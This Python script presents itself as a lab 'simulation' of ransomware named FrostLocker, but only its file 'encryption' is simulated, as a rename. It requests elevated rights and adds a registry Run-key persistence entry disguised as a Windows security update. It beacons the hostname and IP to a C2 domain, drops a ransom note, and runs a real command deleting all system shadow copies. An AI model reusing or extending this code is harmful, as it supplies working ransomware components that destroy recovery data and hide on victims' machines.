
import os
import sys
import ctypes
import socket
import winreg
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import threading
import requests

# --- SIMULATION CONFIG --- #
# SAFETY: Only targets files in the 'C:\simulation_target\' directory.
# Change this to a safe path in your lab VM, e.g., "C:\\test_folder\\"
TARGET_DIR = "C:\\simulation_target\\"
# A list of safe, non-critical file extensions to "encrypt"
TARGET_EXTENSIONS = ['.txt', '.docx', '.xlsx', '.jpg', '.png', '.sim']
# --- END CONFIG --- #

def is_admin():
    """Check if the program is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def establish_persistence():
    """Add the executable to the user's startup registry key to survive reboot."""
    try:
        key = winreg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_WRITE) as regkey:
            executable_path = os.path.abspath(sys.argv[0])
            winreg.SetValueEx(regkey, "WindowsSecurityUpdate", 0, winreg.REG_SZ, executable_path)
        print("[*] Persistence established.")
    except Exception as e:
        print(f"[!] Could not establish persistence: {e}")

def exfiltrate_data():
    """Simulate sending a beacon to the attacker's command & control server."""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        data = {
            'hostname': hostname,
            'ip': local_ip,
            'status': 'infected'
        }
        # This will fail because the domain doesn't exist, but simulates the attempt.
        requests.post('http://c2server-mta43f92[.]com/register', json=data, timeout=3)
    except:
        # Failure is expected in a lab environment.
        pass

def simulate_encryption(file_path):
    """
    "Encrypts" a file by appending '.encrypted' to its name.
    In a real attack, this would use cryptography to make files unrecoverable.
    """
    try:
        # 1. Generate a random key and IV (like real ransomware would)
        key = get_random_bytes(32) # AES-256 key
        iv = get_random_bytes(16)
        # (In a real attack, we would use these to actually encrypt the file bytes)

        # 2. SAFE SIMULATION: Just rename the file instead of real encryption.
        os.rename(file_path, file_path + '.frostlocked')
        print(f"[*] Encrypted: {file_path}")
    except Exception as e:
        print(f"[!] Failed to process {file_path}: {e}")

def drop_ransom_note():
    """Creates a ransom note in every directory where files were encrypted."""
    note = f"""
    !!! YOUR FILES HAVE BEEN FROSTLOCKED !!!

    What happened?
    All your important documents, photos, and databases have been encrypted.
    There is no way to recover your data without our decryption service.

    What do I do?
    1. Do not modify or rename the encrypted files. This will cause permanent data loss.
    2. Contact us at frostlocker@onionmail[.]org to receive payment instructions.
    3. You must pay a ransom of $1500 in Bitcoin within 72 hours.

    Your unique ID: {get_random_bytes(8).hex()}
    """
    note_path = os.path.join(TARGET_DIR, "!!!_READ_ME_!!!.txt")
    with open(note_path, 'w') as f:
        f.write(note)
    # Open the note on the user's screen
    os.startfile(note_path)

def main():
    # Check for admin privileges
    if not is_admin():
        # If not admin, try to relaunch with admin rights (UAC bypass simulation)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

    print("[*] FrostLocker simulation activated.")
    # Step 1: Call home to C2
    threading.Thread(target=exfiltrate_data).start()
    # Step 2: Ensure we come back after a reboot
    establish_persistence()

    # Step 3: The destructive part - "encrypt" files
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        # Create some dummy files to encrypt if the folder is new
        for i in range(5):
            with open(os.path.join(TARGET_DIR, f"important_document_{i}.txt"), 'w') as f:
                f.write("This is a simulated important file for training purposes.")

    encrypted_count = 0
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            file_path = os.path.join(root, file)
            if any(file_path.endswith(ext) for ext in TARGET_EXTENSIONS):
                simulate_encryption(file_path)
                encrypted_count += 1

    # Step 4: Show the ransom note
    if encrypted_count > 0:
        drop_ransom_note()

    # Step 5: Simulate deleting shadow copies to prevent recovery (a common ransomware tactic)
    os.system('vssadmin delete shadows /all /quiet 2>nul')

    print("[*] Simulation complete. Ransom note displayed.")

if __name__ == "__main__":
    main()